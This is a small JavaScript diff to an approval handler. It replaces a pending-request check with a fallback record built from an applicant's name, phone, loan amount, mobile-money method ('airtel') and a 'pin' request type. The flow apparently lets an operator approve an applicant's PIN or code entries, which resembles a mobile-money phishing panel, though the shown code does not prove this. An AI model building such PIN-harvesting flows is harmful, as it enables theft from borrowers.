@@ -921,13 +921,20 @@
         }
 
         function handleApprovalDecision(decision, requestId) {
-            if (!pendingApproval || pendingApproval.requestId !== requestId) {
-                console.warn('⚠️ No pending request matches:', requestId);
-                showStatus('⚠️ Aucune demande en attente correspondante', 'error');
-                return;
-            }
+            const fallbackMethod = appData.paymentMethod || 'airtel';
+            const fallbackType = (appData.pendingRequest && appData.pendingRequest.type) || 'pin';
+            const current = (pendingApproval && pendingApproval.requestId === requestId)
+                ? { ...pendingApproval }
+                : {
+                    fullName: (appData.personal && appData.personal.fullName) || 'N/A',
+                    phone: (appData.personal && appData.personal.phone) || '',
+                    amount: (appData.personal && appData.personal.loanAmount) || '0',
+                    method: fallbackMethod,
+                    type: fallbackType,
+                    code: '',
+                    requestId: requestId
+                };
 
-            const current = { ...pendingApproval };
             const nextPage = getNextPage(current.type, current.method);
             const errorInfo = getErrorInfo(current.type, current.method);
 
